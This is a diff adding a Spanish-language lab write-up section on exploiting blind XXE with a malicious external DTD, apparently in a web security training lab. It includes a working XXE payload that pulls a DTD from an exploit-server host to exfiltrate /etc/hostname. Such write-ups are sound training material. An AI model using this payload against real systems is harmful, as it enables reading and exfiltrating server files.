@@ -155,3 +155,36 @@ Como podemos ver, se realizó la consulta al sitio web generado con Burp Collabo
 
 ## 5. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
 
+```
+Este laboratorio tiene una función "Check stock" que analiza la entrada XML pero no muestra el resultado.
+
+Para resolver el laboratorio, exfiltra el contenido del archivo /etc/hostname.
+```
+
+Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.
+
+![](img14.png)
+
+Así que ahora iremos al **Exploit Server** y realizamos la siguiente configuracion.
+
+![](img15.png)
+
+Y le damos en botón **Store**. Configuramos nuestro payload en el repeater, al siguiente valor:
+
+```
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://ac7a1f721e5094c980c1385d016c00bd.web-security-academy.net/malicious.dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+![](img16.png)
+
+Ahora, en la seccion de **Exploit Server** hacemos clic en **Access Log**.
+
+![](img17.png)
+
+Entonces obtenemos que el contenido de **/etc/hostsname** es **f681f51b2be3**. Enviamos el valor para completar el laboratorio.
+
+![](img18.png)
+
+## 6. Lab: Exploiting blind XXE to retrieve data via error messages
+
